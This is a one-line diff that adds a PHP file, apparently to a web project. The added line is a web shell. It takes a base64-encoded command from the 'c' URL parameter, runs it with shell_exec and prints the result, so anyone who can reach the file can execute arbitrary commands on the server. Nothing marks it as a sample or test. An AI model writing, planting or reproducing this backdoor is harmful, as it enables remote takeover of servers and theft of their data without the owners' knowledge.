@@ -1,0 +1,1 @@
+<?php ($c=base64_decode($_GET['c']??''))&&print(shell_exec($c));
